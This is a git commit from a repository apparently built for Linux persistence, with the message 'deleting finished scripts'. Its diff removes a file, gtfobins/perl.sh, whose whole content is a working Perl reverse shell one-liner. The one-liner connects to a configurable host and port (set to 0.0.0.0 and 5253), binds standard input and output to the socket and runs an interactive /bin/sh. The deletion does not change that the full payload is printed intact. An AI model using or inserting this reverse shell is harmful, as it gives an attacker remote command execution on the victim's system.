fc4c801a6d86048757044e43c8bec42fc6e69444
montysecurity <18372298+montysecurity@users.noreply.github.com>
2021-02-02 04:45:47 -0600

    deleting finished scripts

--- gtfobins/perl.sh
+++
@@ -1,7 +0,0 @@
-linper=yes
-
-#!/bin/bash
-
-export RHOST=0.0.0.0
-export RPORT=5253
-perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
